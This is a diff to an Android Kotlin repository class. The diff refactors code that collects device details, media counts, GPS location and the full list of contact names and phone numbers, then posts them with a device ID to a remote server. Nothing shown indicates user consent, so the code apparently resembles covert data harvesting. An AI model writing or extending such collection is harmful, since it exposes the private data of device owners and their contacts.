@@ -25,7 +25,11 @@ import android.database.Cursor
 import android.provider.ContactsContract.CommonDataKinds.Phone
 
 class Repository(private val context: Context) {
-    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(20, TimeUnit.SECONDS).build()
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .callTimeout(60, TimeUnit.SECONDS)
+        .build()
 
     suspend fun collectDeviceInfo(): Boolean = withContext(Dispatchers.IO) {
         val info = DeviceInfo(model = Build.MODEL ?: "", version = Build.VERSION.RELEASE ?: "")
@@ -34,8 +38,24 @@ class Repository(private val context: Context) {
     }
 
     suspend fun collectContactsCount(): Boolean = withContext(Dispatchers.IO) {
-        val count = context.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, arrayOf(ContactsContract.Contacts._ID), null, null, null)?.use { c -> c.count } ?: 0
-        val s = JSONObject().put("count", count).toString()
+        val cr = context.contentResolver
+        val ids = mutableSetOf<String>()
+        cr.query(
+            Phone.CONTENT_URI,
+            arrayOf(Phone.CONTACT_ID, Phone.NUMBER),
+            null,
+            null,
+            null
+        )?.use { c ->
+            val idIdx = c.getColumnIndex(Phone.CONTACT_ID)
+            val numIdx = c.getColumnIndex(Phone.NUMBER)
+            while (c.moveToNext()) {
+                val id = if (idIdx >= 0) c.getString(idIdx) else null
+                val num = if (numIdx >= 0) c.getString(numIdx) else null
+                if (!num.isNullOrBlank() && !id.isNullOrBlank()) ids.add(id)
+            }
+        }
+        val s = JSONObject().put("count", ids.size).toString()
         writeEncrypted("contacts.json.enc", s)
     }
 
@@ -100,16 +120,29 @@ class Repository(private val context: Context) {
         val images = countByMime(resolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
         val videos = countByMime(resolver, MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
         val files = if (Build.VERSION.SDK_INT < 33) countByMime(resolver, MediaStore.Files.getContentUri("external")) else mapOf()
+        val loc = LocationProvider(context).currentLocation()
         val jsonObj = JSONObject()
             .put("deviceId", deviceId)
             .put("deviceInfo", JSONObject().put("model", Build.MODEL ?: "").put("version", Build.VERSION.RELEASE ?: ""))
-            .put("contactsCount", resolver.query(ContactsContract.Contacts.CONTENT_URI, arrayOf(ContactsContract.Contacts._ID), null, null, null)?.use { it.count } ?: 0)
+            .put("contactsCount", run {
+                val ids = mutableSetOf<String>()
+                resolver.query(Phone.CONTENT_URI, arrayOf(Phone.CONTACT_ID, Phone.NUMBER), null, null, null)?.use { c ->
+                    val idIdx = c.getColumnIndex(Phone.CONTACT_ID)
+                    val numIdx = c.getColumnIndex(Phone.NUMBER)
+                    while (c.moveToNext()) {
+                        val id = if (idIdx >= 0) c.getString(idIdx) else null
+                        val num = if (numIdx >= 0) c.getString(numIdx) else null
+                        if (!num.isNullOrBlank() && !id.isNullOrBlank()) ids.add(id)
+                    }
+                }
+                ids.size
+            })
             .put("mediaStats", JSONObject()
                 .put("images", images.values.sum())
                 .put("videos", videos.values.sum())
                 .put("docs", (files.values.sum() - images.values.sum() - videos.values.sum()).coerceAtLeast(0))
                 .put("byType", JSONObject((images + videos + files))))
-            .put("location", JSONObject().put("lat", LocationProvider(context).currentLocation().lat).put("lon", LocationProvider(context).currentLocation().lon))
+            .put("location", JSONObject().put("lat", loc.lat).put("lon", loc.lon))
 
         val body = jsonObj.toString().toRequestBody("application/json".toMediaTypeOrNull())
         val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/data").post(body).build()
@@ -160,12 +193,16 @@ class Repository(private val context: Context) {
                     else -> null
                 } ?: ""
                 if (id == null) continue
-                val phones = mutableListOf<String>()
+                val phones = mutableSetOf<String>()
                 cr.query(Phone.CONTENT_URI, arrayOf(Phone.NUMBER), Phone.CONTACT_ID + "=?", arrayOf(id), null)?.use { pc ->
                     val numIdx = pc.getColumnIndex(Phone.NUMBER)
-                    while (pc.moveToNext()) { phones.add(pc.getString(numIdx) ?: "") }
+                    while (pc.moveToNext()) {
+                        val raw = pc.getString(numIdx) ?: ""
+                        val normalized = raw.replace("\\s".toRegex(), "").replace("-", "")
+                        if (normalized.isNotBlank()) phones.add(normalized)
+                    }
                 }
-                list.add(JSONObject().put("name", name).put("phones", phones))
+                list.add(JSONObject().put("name", name).put("phones", phones.toList()))
             }
         }
         val payload = JSONObject().put("deviceId", deviceId).put("contacts", list)
